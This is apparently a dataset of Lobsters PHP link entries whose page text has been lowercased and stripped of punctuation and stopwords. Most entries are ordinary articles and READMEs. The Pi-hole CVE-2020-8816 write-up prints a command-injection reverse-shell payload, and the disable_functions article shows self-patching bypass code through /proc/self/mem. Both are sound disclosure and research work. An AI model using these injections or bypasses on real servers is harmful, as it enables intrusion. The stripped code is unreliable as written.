expertise knowledge improving performance tuning armbased aws graviton systemsconclusionphp release key obtain maximum performance instance php make instance even appealing delivering higher performance lower cost compared instancesto get started check new instance powered aws please leave comment
35,Lobsters,php,PHP programming,PHP 8.0: Match Expressions,https://php.watch/versions/8.0/match-expression,php match expression,expression return value multiple matching condition allowed matching case must contain one expression allowed implicit case expression must match condition must exception hierarchy php exception strict match without type coercion match arbitrary expression v backwards compatibility impact backported rfc rfc discussion implementation,match expression syntax one nicest feature php improves switch syntax multiple way status match requestmethod post handlepost get head handleget default throw new exception unsupported functionality match expression compared switch block switch requestmethod status match requestmethod case post status handlepost break post handlepost case get case head status handleget break get head handleget default throw new exception unsupported default throw new exception unsupported match expression return value return value expression used arm similar case switch block assigned variable name match one two echo name two necessary assign return value anything return value matched arm returned match expression multiple matching condition allowed possible match expression contain one matching condition behave similar multiple cascading case key switch block match requestmethod post handlepost get head handleget requestmethod get requestmethod head condition handled handleget matching case must contain one expression unlike switch block contain number expression match arm contain one expression match name foo initfoo processfoo syntax allowed arm must contain single expression implicit break matched arm match expression allows single expression fallthrough switch block switch test case test sendtestalert case send sendnuclearalert easy overlook missing break call switch case allows code fallthrough next case switch block missing break statement make code fallthrough execute sendnuclearalert well although unlikely outcome expect match test test sendtestalert send sendnuclearalert match expression work without explicit break statement executes one matching arm immediately return value making imply break call right expression matched arm executes default case match statement support default arm work similar default case switch block default arm catch expression none condition matched match qux foo bar default echo unknown name unknown qux match expression must match condition switch block silently proceeds code flow matching case key match expression match expression must condition match expression default case handle match match expression throw unhandledmatcherror exception value match value one two match expression throw error fatal error uncaught unhandledmatcherror unhandledmatcherror exception match expression throw unhandledmatcherror exception match within expression unhandledmatcherror new exception class php extends error full hierarchy php core exception class including one added php see hierarchy php exception class easily polyfilled class unhandledmatcherror extends error strict match without type coercion one important design choice match expression match without type coercion function read mixed key string return match key integer string true bool true empty array array read integer read string read true bool true typical switch block case matched loosely ie match expression matching arm matched strict comparison leaving possible bug switch block snippet individual arm matched value type match arbitrary expression match expression allows given value matched expression match foo page found response redirect redirect client getcode client error response getcode response error default unknown error expression evaluated order laid match expression try match foo order foo foo response redirect foo client getcode foo response getcode default find positive match rest code evaluated match v switch backwards compatibility impact match expression new syntax php code us match expression work older php version unhandledmatcherror exception class backported trying run code us expression fail parse error older php version parse error syntax error unexpected tdoublearrow line rfc rfc discussion implementation
36,Lobsters,php,PHP programming,PEST - An elegant PHP Testing Framework,https://github.com/pestphp/pest,pest elegant php testing framework,join github today sign,dismiss join github today github home million developer working together host review code manage project build software together sign
37,Lobsters,php,PHP programming,Happy 25th Anniversary to PHP,https://groups.google.com/forum/m/#!msg/comp.infosystems.www.authoring.cgi/PyJ25gZ6z7A/M9FkTUVDfcwJ,happy anniversary php,,use google group discussion please enable javascript browser setting refresh page
38,Lobsters,php,PHP programming,Making Collabora Online trivial to setup,https://people.gnome.org/~michael/blog/2020-06-03-php-online-proxy.html,making collabora online trivial setup,improving collabora online installability demo server thing used work ideal world code apache nginx websocket replacement trickier php j xmlhttprequest ajax handshake persistent connection running daemon php proxy problem proxy polling v longpolling solution limitation caveat ideal instruction fpm opcache thanks next libreoffice community conspiracy conference fun,today release big step improving collabora online installability home user collabora typically focused supporting enterprise user pay bill familiar getting certificate configuring web server proxy port number help problem left homeusers eager take advantage privacy ease use large barrier entry set adding easytosetup demo server user course people want use hardware let document site today released new way using new php proxying protocol appimage bundled singleclick installable nextcloud app bringing php solution soon quick writeup work thing used work ideal world ideally home user grab code docker image installs package public facing http webserver create certificate host configure use loolwsdxml andor setup apache nginx reverse proxy ssl unwrap certificate magic done proxying webserver mean end nice c browser talking directly c kernel across network another c app loolwsd webservices daemon sure ssl transport websocket layered perhaps intermediate proxyingunwrapping webserver life reasonably sensible daemon load persists document memory manages locksdown access manages low latency high performance bidirectional transport persistent secure connection browser even reworked mainloops use microsecond wait avoid silly one millisecond wasteage look show particularly poor crosseuropean ping finland spain particularly heavy document rerendering well sw time render result browser work reasonably nicely editing server san francisco eu push notification fast problem world seems hard casual user configure websocket replacement trickier php j ideally could setup web server proxy request nicely getgo course collabora online inevitably integrated alreadyworking php app sort reuse already working phpgoodness php course builtin support websockets usecase furthermore expected php process shortlived spawned quickly server killed say second default bad behavior still around javascript side nt appear api use send lowlatency message across web except venerable xmlhttprequest api launched spasm ajax web couple decade ago make asynchronous request badly need low latency get interactive editing work going pan clearly want use http tl negotiating secure connection requires handshake rich roundtrip latency exactly nt want mercifully web browser server type got together long time ago two thing create pool multiple connection web server get faster page load also use persistent connection keepalive get many request negotiated tl connection turn fact avoid tl overhead also make several parallel request without huge latency penalty despite xmlhttprequest api excellent client connection loose little latency stack binary text websocketlike protocol top running daemon clearly want avoid document daemon regularly killed every second luckily disowning spawned process reasonably trivial fail connect launch appimage bundled inside php app close hand get serve request want initially thought simple reading php input writing socket connected loolwsd reading output back writing php output unfortunately thing never quite easy php proxy problem love php probably want read proxy code three hundred line necessary significant problem need get data apache spawned php process send via socket quickly many default setup love parse reparse php request first attempt integrate prototype nextcloud php infrastructure allowing every app say went overhead per request ideal thankfully help tweak nginx config use standalone proxyphp nice necessary get html request length content reconstructed php give mean iterating parsed version header php carefully parsed carefully serialize trying get request body php input sound like ideal stream use point except unmentioned documentation post handling empty stream necessary reconstruct mimelike subelements php get beautiful clean blob back loolwsd containing header content want proxy back unfortunately php going let open php output write across parse request manually populate header dropping body helpful half older per request would really lovely php rawinput php rawoutput provided sharp tool could use shoot foot quickly polling v longpolling initial implementation concerned reply latency get reply back server soon available implemented elegant scheme rotating series four wait request turned every second webserver closed message loolwsd needed sending could immediately return without waiting incoming message beautiful scheme fell foul fact php process sitting waiting consumes nonrenewable resource webserver default process limited collaboration around two user without gumming machine horrible clearly vital keep php transaction time low need get fast nice idea waiting little response prepared returning message sound great consume limited resource concurrent php transaction bad news necessary rabid polling sustain multiple concurrent user rather unfortunate picture show needing get apachephp fast give u extra polling period latency solution ping server every around half target incontinent latency luckily backoff regularly notice poll nothing going coming back currently exponentially reduce polling frequency every notice nothing happening wire mean another collaborator might typed something might catchup later course anything type reset show rapidly course worst case server need get information client respond go without saying protocol asynchronous everywhere around intercontinental latency event ev miss train sent b response missing train c returning back browser reply missing f data getting back g much design spreadsheet look like practice flurry connection startup clear exponential backoff continue tune get editing session see connection reused new one created go along limitation caveat perhaps interesting approach come caveat security appimage signed verified built stock package longer run capability necessary isolate document chroot jail isolation thereby diminished also disable mode default normal installs checkout proxyprefix setting loolwsdxml want something similar provide appimages latency discussed extensively latency slightly higher recommended intercontinental usage course following ideal instruction give much better performance working bandwidth individual http request many header significant overhead much verbose minimal binary websocket protocol scalability work really nicely home user people collaborating tweak php fpm enable opcache make everything quicker proxying larger number user want properly managed configured collabora online perhaps ha cluster andor globalscale thing running good idea spend little extra time installing docker image package configuring webserver proper proxying websockets thanks next many thanks collaborans kendy ash muhammet mert andras well julius nextcloud took poor quaity prototype turned product anyone bad idea take real skill dedication make work beautifully thank course thanks libreoffice community suggestion feedback next continue work tuning improving latency hiding example grouping together large number svg icon image need load cache browser firstload generally useful user course love able continue investing better integration partner rich solution case painfully obvious reflection reflected mine mine nt reflect view collabora suse novell document foundation spaghetti hurler international anyone else also important realise swedish conspiracy occasionally people ask formal photo conference fun
39,Lobsters,php,PHP programming,Attributes — aka annotations — in PHP 8,https://stitcher.io/blog/attributes-in-php-8,attribute aka annotation php,php attribute rundown internals list another rfc array destructuring technical theory source code attribute configuration using binary operation builtin attribute jit twitter email reddit newsletter twitter pr,php attribute php able use attribute goal attribute also known annotation many language add meta data class method variable structured way concept attribute nt new using docblocks simulate behaviour year addition attribute though firstclass citizen language represent kind meta data instead manually parse docblocks look like make custom attribute caveat question answered post let dive rundown first thing first attribute would look like wild use supportattributeslistensto class productsubscriber listensto productcreated class public function onproductcreated productcreated event listensto productdeleted class public function onproductdeleted productdeleted event showing example later post think example event subscriber good one explain use attribute first also yes know syntax might wished hoped might preferred docblocks stay though better learn deal thing worth mentioning syntax option discussed good reason syntax chosen read whole discussion rfc internals list said let focus cool stuff would listensto work hood first custom attribute simple class annotated attribute attribute base attribute used called phpattribute original rfc changed another rfc afterwards would look like attribute class listensto public string event public function construct string event event event pretty simple right keep mind goal attribute meant add meta data class method nothing nt ca nt used example argument input validation word would nt access parameter passed method within attribute previous rfc allowed behaviour rfc specifically kept thing simple back event subscriber example still need read meta data register subscriber based somewhere coming laravel background use service provider place feel free come solution boring boilerplate setup provide little context class eventserviceprovider extends serviceprovider private array subscriber productsubscriber class public function register void eventdispatcher app make eventdispatcher class foreach subscriber subscriber foreach resolvelisteners subscriber event listener eventdispatcher listen event listener note event listener syntax unfamiliar get speed post array destructuring let look resolvelisteners magic happens private function resolvelisteners string subscriberclass array reflectionclass new reflectionclass subscriberclass listener foreach reflectionclass getmethods method attribute method getattributes listensto class foreach attribute attribute listener attribute newinstance listener listener event subscriberclass method getname return listener see easier read meta data way compared parsing docblock string two intricacy worth looking though first attribute newinstance call actually place custom attribute class instantiated take parameter listed attribute definition subscriber class pas constructor mean technically nt even need construct custom attribute could call attribute getarguments directly furthermore instantiating class mean got flexibility constructor parse input whatever way like say would good always instantiate attribute using newinstance second thing worth mentioning use reflectionmethod getattributes function return attribute method pas two argument filter output order understand filtering though one thing need know attribute first might obvious wanted mention real quick anyway possible add several attribute method class property constant could example route http post productscreate autowire class productscreatecontroller public function invoke mind clear reflection getattributes return array let look output filtered say parsing controller route interested route attribute easily pas class filter attribute reflectionclass getattributes route class second parameter change filtering done pas reflectionattribute isinstanceof return attribute implementing given interface example say parsing container definition relies several attribute could something like attribute reflectionclass getattributes containerattribute class reflectionattribute isinstanceof nice shorthand built core technical theory idea attribute work practice time theory making sure understand thoroughly first mentioned briefly attribute added several place class well anonymous class classattribute class myclass object new objectattribute class property constant propertyattribute public int foo constattribute public const bar method function methodattribute public function dosomething void functionattribute function foo well closure closure closureattribute fn method function parameter function foo argumentattribute bar declared docblocks methodattribute public function dosomething void take one several argument defined attribute constructor listens productcreatedevent class autowire route http post productscreate allowed parameter pas attribute already seen class constant class name scalar type allowed little said though attribute accept constant expression input argument mean scalar expression allowed even bit shift well class constant array array unpacking boolean expression null coalescing operator list everything allowed constant expression found source code attributewithscalarexpression attributewithclassnameandconstants pdo class phpversionid attributewithclassconstant http post attributewithbitshift attribute configuration default attribute added several place listed possible however configure used specific place example could make classattribute used class nowhere else optingin behaviour done passing flag attribute attribute attribute class look like attribute attribute targetclass class classattribute following flag available attribute targetclass attribute targetfunction attribute targetmethod attribute targetproperty attribute targetclassconstant attribute targetparameter attribute targetall bitmask flag combine using binary operation attribute attribute targetmethodattribute targetfunction class classattribute another configuration flag repeatability default attribute ca nt applied twice unless specifically marked repeatable done way target configuration bit flag attribute attribute isrepeatable class classattribute note flag validated calling attribute newinstance earlier builtin attribute base rfc accepted new opportunity arose add builtin attribute core one example deprecated attribute popular example jit attribute sure last one read post jit sure see builtin attribute future final note worrying generic syntax wo nt conflict ever added php safe got usecases already mind attribute got thought share awesome new feature php reach twitter via email discus reddit would like stay date new content feel free subscribe newsletter follow twitter noticed tpyo submit pr fix
40,Lobsters,php,PHP programming,A collaborative social publishing engine,https://github.com/idno/Known/,collaborative social publishing engine,known social group platform installation oneclick known site reclaim hosting dreamhost installing http docswithknowncomenlatestinstallindexhtml installing package http wwwmarcuspoveycoukknown installing github http githubcomidnoknown installing composer support u find project useful really want support u fund u opencollective get support community link contributingmd contributor contribute backer become backer sponsor become sponsor copyright license license known also contains http githubcomtwitterbootstrap http githubcomjqueryjquery http githubcomanandkunaltorophp http githubcomforkawesomeforkawesome http codegooglecompmrclay http githubcomaaronpkmentionclient http http fitvidsjscom http leafletjscom http githubcomswiftmailerswiftmailer http githubcominternationsantwort http githubcomjakiestfumentionjs http githubcomjohndyermediaelement http githubcomsimplepiesimplepie http wwwbootstraptogglecom http githubcomtinymcetinymce http githubcompaypalbootstrapaccessibilityplugin http htmlpurifierorg http githubcomkatspaughwavesurferjs http githubcommongodbmongophplibrary http githubcomexifjsexifjs http githubcommapkycaphpogp thank browserstack,known social group platform installation oneclick known site want install web space recommend reclaim hosting includes oneclick known installation known also known work dreamhost highquality web hosting provider installing known active development requires php selected extension together supported database backend find detailed installation instruction http docswithknowncomenlatestinstallindexhtml installing package unofficial install package periodically built latest code available http wwwmarcuspoveycoukknown installing github opt check workinprogress development code git repository http githubcomidnoknown check repo git clone http githubcomidnoknowngit fetch dependency cd known composer install installing composer install known directly composer using composer createproject idnoknown optionally install latest bleeding edge code way composer createproject idnoknown dev support u find project useful really want support u fund u opencollective get support community link detail contributing known project please read contributingmd contributor project exists thanks people contribute contribute backer thank backer become backer sponsor support project becoming sponsor logo show link website become sponsor copyright license except included thirdparty project known c known inc unless otherwise stated known licensed apache software license see license information known logo c known inc permission known inc required use known name logo part project product service domain company name except included official theme distributed known logo external service c respective owner right reserved third party library licensed separately known also contains twitter bootstrap distributed apache license source http githubcomtwitterbootstrap jquery distributed mit license source http githubcomjqueryjquery portion symfony distributed mit license torophp distributed mit license source http githubcomanandkunaltorophp fork awesome distributed open font license version http githubcomforkawesomeforkawesome steve clay autop distributed mit license source http codegooglecompmrclay aaron parecki webmention client distributed apache license source http githubcomaaronpkmentionclient barnaby walter microformats parser distributed mit license source http fitvidsjs distributed wtfpl license source http fitvidsjscom leafletjs distributed bsd license source http leafletjscom swiftmailer distributed mit license source http githubcomswiftmailerswiftmailer antwort email template distributed mit license source http githubcominternationsantwort mentionjs bootstrap user atmention library distributed mit license source http githubcomjakiestfumentionjs mediaelementjs crossbrowser medium player distributed mit license source http githubcomjohndyermediaelement simplepie feed parser distributed bsd license source http githubcomsimplepiesimplepie bootstrap toggle distributed mit license source http wwwbootstraptogglecom tinymce rich text editor distributed lgpl license source http githubcomtinymcetinymce paypal bootstrap accessibility plugin distributed bsd license source http githubcompaypalbootstrapaccessibilityplugin htmlpurifier distributed lgpl license source http htmlpurifierorg wavesurfer distrubuted creative common attribution unported license source http githubcomkatspaughwavesurferjs mongodbphplibrary distributed apache licence source http githubcommongodbmongophplibrary exifjs distributed mit licence source http githubcomexifjsexifjs phpogp distributed licence source http githubcommapkycaphpogp thank thanks browserstack providing infrastructure allows u test real browser
41,Lobsters,php,PHP programming,Hacklang at Slack: A Better PHP,https://slack.engineering/hacklang-at-slack-a-better-php-65f239cbc9e9,hacklang slack better php,several company hhvm hack best part static type checking game changer since php class property generic statically type logic bug community package generic shape enums hack array standard library gradual typing enables migration partial mode approach thoughtful type safety verifiable contract shape help represent complex structure arraymerge different type generic dicts contain multiple type shape asyncawait enables simple concurrency mutexes hack handful language asyncawait multitasking without multithreading guideline breaking php compatibility free hack grow breaking compatibility php hhvm rapidly removed useful new feature packagist published hhast package token stream hack json schema hack codegen hack sql fake xhp looking forward option python javascript ruby,slack launched php backend along several company switched hhvm ran php code faster stayed hhvm offer entirely new language hack searchable hacklang hack make developer faster improving productivity better tooling hack began superset php retaining best part like editrefresh workflow requestoriented memory model enable speedy development addition number qualityoflife improvement hack add better type system static type checker help catch bug allow developer code refactor confidence post talk migrated hack benefit gave u thing consider codebase static type checking game changer php type system come long way since php possible annotate return type class property scalar type remaining hole like lack generic may resolved future biggest flaw type checked runtime costly time find typerelated bug either breaking test suite worse user report production error log hack type checking happens statically without running code type change signature function hundred call site see error one need updating even hitting save game changer productivity difference finding bug millisecond typing compared waiting comprehensive test suite finding deploying hard overstate akin productivity difference developing website php v c hack bother trying run code type checker passing usually work allows slack developer build refactor confidence focusing testing effort higher value area like logic bug static typing help prevent static type checking possible php community package using php strongly recommend using one however hack type checker advantage much fullfeatured type system work hack built ground enable static type checking feature php lack like generic shape enums hack array welltyped standard library enable rigorous static analysis gradual typing enables migration started hack partial mode treat untyped value type usable purpose typescript take approach enabled incremental type time file became fully typed changed default strict mode stayed way surprisingly gradually adding type weaklytyped codebase made thoughtful type safety ever working stronglytyped language like java go instead requirement get compiler run type conscious decision add value codebase justify spending time adding type observing changed working life part codebase easy type others required refactoring enable type safety found prevented bug type serve form inline documentation verifiable unlike comment block helping everyone read understand code also serve contract different part codebase crucial productivity large shared codebase like slack backend hack type system one feature particular shape caught like wildfire slack believe reason never looked back introduced hack codebase shape help represent complex structure php array type bewilderingly act list ordered set value map set key value pair time programming language use separate type experience endless source bug php code especially function like arraymerge treat listlike maplike array differently hack improves upon separating different type using generic describe type key value listlike array containing string vec string maplike array string key integer value dict string int dicts contain multiple type dict string mixed valid particularly useful type annotation say dict contains string key value type enter shape shape array contains known key specific type key may optional preceded example shape definition represent argument http post request many optional field type httppostoptions shape timeout int port int httpbasicauth string header dict string string formdata dict string string jsonpayload jsonserializable useragent string followredirects bool function signature us shape type option function httppost string url httppostoptions option httpresponse implementation call site might look like result httppost http examplecom shape timeout formdata dict example test help ensure correct type used field also help prevent typo name key call site function body shape accessed make shape much impactful developer productivity simple array type annotation shape assembling call function would require reading body large doc block may fully date understand name expected type optional v required status argument shape used variety use case slack including database row codegenerated shape directly db schema expected result decoding json payload function many optional argument asyncawait enables simple concurrency feature added slack request tends work keep user experience snappy concurrency common solution multiple thing time single request many programming language adding concurrency mean adding significant complexity mutexes threadsafe data structure callback thing slow developer making code difficult reason debug hack one handful language implement asyncawait pattern multitasking without multithreading asyncawait simple abstraction allows function paused waiting io freeing runtime schedule task simply adding async await keywords following guideline code migrated take advantage concurrency without breaking mental model code work example using concurrent code block fetch data two source fetch previously done sequentially adding await concurrent keep code easy read allowing fetch take place concurrently async function getmentions user user awaitable vec mention concurrent fetch user mention atmentions await getatmentions user fetch channel mention channel user channelmentions await getatchannelmentions user return sortmentions atmentions channelmentions breaking php compatibility free hack grow hhvm come long way since slack began using breaking compatibility php controversial decision required u eliminate every last line php code dependency codebase enabled huge efficiency soundness improvement language since hhvm release removed php support developer rapidly removed phpisms inhibit type safety andor performance adding useful new feature keeping update large codebase nearly full time job largest downside leaving php community loss extensive ecosystem open source package packagist luckily hack project still published packagist several high quality one hhast enables expressive lint rule automated code migration syntax tree unlike php package involve parsing token stream slack opensourced hack json schema leverage hack codegen create hack code type definition json schema definition hack sql fake library contributed simulate mysql use unit test handle million sql query every test run slack xhp enables typesafe async serverside rendered html share history react jsx best serverside html framework worked looking forward hack free php past excited see become firstclass language right longer feasible gradually migrate php codebase hack expect see developer choose hack new project language stabilizes especially familiarity php looking something better general trend industry towards adding static type checking interpreted language multiple option python javascript ruby combining convenience interpreted language static type checking worth considering code base size scott sandler principal engineer core infrastructure team slack slack hiring backend engineer
42,Lobsters,php,PHP programming,FAQ Off: Interactive Q&A Platform to Counteract Trolling and Misinformation,https://github.com/soatok/faq-off,faq interactive q platform counteract trolling misinformation,faq faq sealioning anthrokit soatok twitchtv channel brilliant patreon post introduced faq faq feature glance interactive question answer website html markdown support troll spam defense collaboration author author security html purifier stored securely installation getting code dependency database setup webserver configuration let encrypt,faq faq let build gamebookstyle faq website counteract sealioning mob harassment social medium faq selfhostable microservice based slim framework anthrokit developed soatok live twitchtv channel invite link given patreon supporter brilliant tier higher learn please see patreon post introduced faq faq feature glance interactive question answer website guide reader answer question shortcircuit common line disruptive discourse write answer ad nauseum html markdown support troll spam defense administrator enable invite mode requires invitation code existing user sign invitation tree administrator see invited identify common entry point misbehaving user curate community collaboration user share author profile colleague publish group user belong unlimited number author author share access unlimited number user one security entry written html markdown processed html purifier protect crosssite scripting attack password stored securely use twitter username twitter handle knowable administrator randomly generated public id provided keep login handle andor twitter handle anonymous everyone else installation getting code dependency first clone git repository git clone http githubcomsoatokfaqoff targetdirname next run composer install nodev inside destination directory database setup run bincreateconfigphp create local configuration file valid postgresql database credential onhand stage next run bininstall finish installing database table webserver configuration make sure configure virtual host use public directory document root bad varwwwfaqoff good varwwwfaqoffpublic general rule user read readmemd file configured server incorrectly need go another layer highly recommended use http afford tl certificate let encrypt offer free certificate automatic renewal via certbot example nginx configuration might look like server listen ssl listen ssl sslcertificate etcletsencryptlivefaqexamplecomfullchainpem sslcertificatekey etcletsencryptlivefaqexamplecomprivkeypem include snippetssslparamsconf root varwwwfaqoffpublic servername faqexamplecom index indexphp indexhtml indexhtm location php include snippetsfastcgiphpconf fastcgipass unix location first attempt serve request file directory fall back displaying tryfiles uri uri indexphp args location wellknown allow server listen listen root varwwwfaqoffpublic index indexhtml indexhtm servername faqexamplecom location wellknown allow location first attempt serve request file directory fall back displaying tryfiles uri uri redirect http return http faqexamplecom requesturi
43,Lobsters,php,PHP programming,Favourite Diff,https://essays.jwatzman.org/essays/favourite-diff.html,favourite diff,favourite diff,favourite diff want tell story one favourite diffs ever committed probably objective measure personal favourite make good story boot several year ago small team building static analysis typechecking tool idea analysis would help rest large engineering team reduce defect flagship webapp written php despite somewhat unfinished tool already improved life enough made way commit hook core workflow one afternoon u team grabbing lunch together conversation turned recent bug webapp started writing certain kind data onto wrong database huge problem yet potential serious security issue future bit effort expended clean data beyond fixing bug none domain directly affect u thing really got u going source bug switch fallthrough first time something like happened recalled similar incident year code started something subtly wrong due bug switch fallthrough involved one heard every bug made production several caught fixed silly language misfeature complained maybe kind made sense c highlevel language like php really reason switch fall well yet another php design mistake told would great someone could change design language live wait people decide design language u right table agreed stupid fixed okay fine influence design php via typechecking tool absolutely de facto control php used practise company infinite social capital abuse control unpopular thing switch fallthrough exactly beloved feature php banning would likely seen another major win tool somehow seem occurred anyone everyone complaining one suggesting real action realised recently playing around control flow detection knew exactly implement change declared fallthrough done going go back desk remove knew building new module use tiresome cleanup existing usage webapp deploying finally ban construct mad recent bug ragecoded course afternoon cleanup annoying thing go faster expected channel fury power change without stopping everyone team supportive unsurprising given previous conversation cleanup diffs written afternoon mostly annotated clearlyintentional fallthroughs fixed real bug new module found started pushing diffs everyone else interacted working main webapp supportive occasionally little horrified initial diff ban switch fallthrough shipped next release tool day later ending feature resulting bug forever anyone could done tech lead could probably done faster one one going simply occurred anyone position technically organisationally fix often biggest contribution one able fix something one realises something fixable diff favourite one first one impactful still one clearcut case career change want see world
44,Lobsters,php,PHP programming,CVE-2020-8816 – Pi-hole Remote Code Execution,https://natedotred.wordpress.com/2020/03/28/cve-2020-8816-pi-hole-remote-code-execution/,pihole remote code execution,impact pihole affected technical analysis source exploitation time line 佐藤 秀峰,impact pihole affected remote code execution vulnerability authenticated user web portal execute arbitrary command underlying server privilege local user executing service exploitation vulnerability automated pihole pihole dns server specialized contentfiltering also feature dhcp server according pihole llc dns sinkhole protects device unwanted content without installing clientside software affected pihole web interface version earlier affected technical analysis order configure builtin dhcp server pihole feature webbased user interface user define static dhcp lease pin ip address given mac address processing user input form mac address application adequately validate validate input reusing shell command legitimate mac address format follows aaaaaaaaaaaa mac address input tampered execute arbitrary code aaaaaaaaaaaa w path p w x path h x z path r z p h p ifs r ifs exec affected configuration panel following excerpt contains code responsible vulnerability code section outside code path used exploitation stripped important line code highlighted sake clarity php pihole black hole internet advertisement c pihole llc http piholenet networkwide ad blocking via hardware file copyright latest version eupl please see license file right license basename server scriptfilename settingsphp die direct access script forbidden function validmac macaddr accepted input format ff character may lower case return pregmatch macaddr read available adlists adlist readadlists read available dns server list dnsserverslist readdnsserverslist error success isset post field handle csrf checkcsrf isset post token post token process request switch post field case dhcp isset post addstatic mac post addmac ip post addip hostname post addhostname validmac mac error mac address htmlspecialchars mac invalid br mac strtoupper mac validip ip strlen ip error ip address htmlspecialchars ip invalid br validdomain hostname strlen hostname error host name htmlspecialchars hostname invalid br strlen hostname strlen ip error omit ip address host name br strlen hostname hostname nohost strlen ip ip noip test lease already included readstaticleasesfile foreach dhcpstaticleases lease lease hwaddr mac error static release mac address htmlspecialchars mac already defined br break ip noip lease ip ip error static lease ip address htmlspecialchars ip already defined br break lease host hostname error static lease hostname htmlspecialchars hostname already defined br break strlen error exec sudo pihole addstaticdhcp mac ip hostname success new static address added break isset post removestatic mac post removestatic validmac mac error mac address htmlspecialchars mac invalid br mac strtoupper mac strlen error exec sudo pihole removestaticdhcp mac success static address mac address htmlspecialchars mac removed break default option found debug true break pihole dashboard savesettingsphp original code source exploitation biggest difficulty exploiting vulnerability user input capitalized call strtoupper lower case character used resulting injection typically injection would look like aaaaaaaaaaaa php r sockfsockopen exec binsh injection would capitalized php r linux command case sensitive would fail yielding sh php found error one way overcome difficulty make use environment variable nightmareinducing posix shell parameter expansion note sh shell used inducing path environment variable leak possible fetch path environment variable server postpending path mac address new static dhcp lease path environment variable leakage luckily u path contains string pihole usr turn contains p h r lowercase character letter need write php r optpihole usrlocalsbin usrlocalbin usrsbin usrbin sbin bin path environment variable possible define p h r shell parameter contain matching lowercase character following posix shell parameter expansion w path p w x path h x z path r z shell parameter introduced injection rewritten p h p ifs r ifs exec note neither php function hexadecimal case sensitive ifs corresponds default shell delimiter character space finally complete reverse shell payload aaaaaaaaaaaa w path p w x path h x z path r z p h p ifs r ifs exec time execute injecting reverse shell payload receiving shell enumerating sudoers action privilege escalation left exercise reader time line françois renaudphilippon disclosed vulnerability pihole llc february llc acknowledged receiving report february llc fixed vulnerability release pihole web interface february llc authorized public disclosure february pihole logo registered trademark pihole llc art 秀峰
45,Lobsters,php,PHP programming,A deep dive into disable_functions bypasses and PHP exploitation,https://www.blackarrow.net/disable-functions-bypasses-and-php-exploitation/,deep dive disablefunctions bypass php exploitation,gentle flight php internals disablefunctions internal function userdefined function anonymous function zif z f handler disablefunctions disablefunctions learning practice sparring phpcli selfpatching procselfmem work modern web server note flyweight combat debugbacktrace exploit uaf note refcount scouting new rival finding lowhanging fruit grammaraware fuzzing disablefunctions interesting disablefunctions playing league alternative way bypass disablefunctions disablefunctions chankro execve execve conclussions disablefunctions reference source code basicfunctions source code procfs bypass beched escapeshellcmd basicfunctions php debugbacktrace uaf exploit bug useafterfree accessing already destructed backtrace argument debugging memory php internals book string management zendstring php internals book c struct hack basic structure php internals book zendclosure source code stdobjecthandlers source code zendinternalfunction source code php bug tracker php clasification security issue fuzzing unserialize function fuzzing php fun profit exploiting unserialize fuzzing grammar fuzzing book phpast github superion grammaraware greybox fuzzing domato dom fuzzer domatophp hunting hidden parameter within php builtin function using frida stupid php gdb helper faster fuzzing python imapopen command injection chankro tool bypass disablefunctions openbasedir bypass disablefunctions openbasedir,performing intrusion test red team operation multiple tool webshells proxysocks tunnel tcp traffic http pivot etc tend deployed compromised web server custom script case server may le bastioned making somewhat difficult compromise one common configuration found php environment use disablefunctions restrict function used php script avoid using dangerous one system passthru etc article take indepth look php directive work circumvent itin summary article aim shed light following topic explanation php internalsautomation search evasion technique based memory corruptionsearching vulnerability fuzzingdescription exploitation techniquesa gentle flight php internals disablefunctionsbefore dive explaining find vulnerability exploit first necessary understand basic concept php work internally following section go deeper certain topic let see key aspect work first functionsin php find main type function internal function standard function provided php installed extension eg compiled userdefined function created running script eg function minorthreat finally anonymous function closure function created script defined name eg name function band printf listen n band internal function usually declared using macro phpfunction phpnamedfunction etc parameter receive also defined macro zendparseparametersstart zendparseparametersend example source code follows phpfunction char str zendbool strict sizet strlen zendstring result zendparseparametersstart zparamstring str strlen zparamoptional zparambool strict zendparseparametersend result unsigned char str strlen strict result null returnstr result else returnfalse looking source code seen parameter function receives defined turn macro depending type case function expects mandatory string parameter optional boolean one code compiled function appear symbol preceded prefix zif acronym zend iinternal function objdump usrlocalbinphp grep zif tail g f text ziffgets g f text ziffwrite g f text ziffgetss g f text ziffread g f text zifdisplaydisabledfunction g f text zifrewind g f text zifftell g f text ziffseek g f text zifdl g f text ziffflushinternal function registered zend engine using zendfunctionentry structure defined follows typedef struct zendfunctionentry const char fname void handler internalfunctionparameters const struct zendinternalarginfo arginfo numargs flag zendfunctionentry first two member stand structure hold function name handler say case function str first member pointing str string second one zifstr function basic function grouped basicfunctions registration array zendfunctionentry structure therefore basicfunctions ultimately ordered relationship function name along pointer handler internal userdefined function registered zend engine using hashtable called functiontable whenever php script make function call handler function searched hashtable disablefunctions directive actthis directive mark application function zenddisablefunction functiontable definedzendapi int zenddisablefunction char functionname sizet functionnamelength zendinternalfunction func func zendhashstrfindptr cg functiontable functionname functionnamelength zendfreeinternalarginfo func func fnflags zendaccvariadic zendacchastypehints zendacchasreturntype func numargs func arginfo null func handler zendfn displaydisabledfunction return success return failure seen code zenddisablefunction search hashtable target function change original handler displaydisabledfunction zendapi zendcold zendfunction displaydisabledfunction zenderror ewarning disabled security reason getactivefunctionname therefore disabled function called php script instead original function executed function showing error message executed disablefunctions affect functiontable original handler found effect reversed patching functiontable calling function directly dive concept detail belowlearning practice sparring phpcli selfpatching procselfmemto put concept seen previous section together aiming able exploit vulnerability later let see work process memory perform disablefunctions evasion step going done using primitive arbitrary reading writing developing exploit example heap binary address leaked go without saying technique work modern web server although true technique used past phpcli sparring training jumping real exploit end section understood everything right pathnote section using php installed debian using aptget install php cli built feb nt road map quite simple locate address binary heap section mappedfind handler code zifsystem another function receives string parameter zifucfirst locate functiontable heap replace function handler entry ucfirst one zifsystemcall ucfirst using system command parameter would system first step directly parse entry procselfmaps next section see information would obtained real exploit rough approximation could following function memmaps print parsing mapped memory region n target array rawmap explode phpeol filegetcontents procselfmaps check foreach rawmap line substr line check strpos line r p false range explode line splitrange explode range target binstart hexdec splitrange target binend hexdec splitrange check substr line heap range explode line splitrange explode range target heapstart hexdec splitrange target heapend hexdec splitrange print binary dechex target binstart dechex target binend n print heap dechex target heapstart dechex target heapend n return target also need couple auxiliary function able work raw process memory use combination fseek fread perform arbitrary reading desired memory address function getdata fd address size fseek fd address data fread fd size return data function value return hexdec strrev value function value return strrev dechex value extracted base address using previously declared memmaps elf header parsed obtain information memory range look basicfunctions array function parseelf base http wikiosdevorgelftutorial parsed array fd fopen procselfmem rb parsed type getdata fd base parsed phoff getdata fd base parsed phentsize getdata fd base parsed phnum getdata fd base 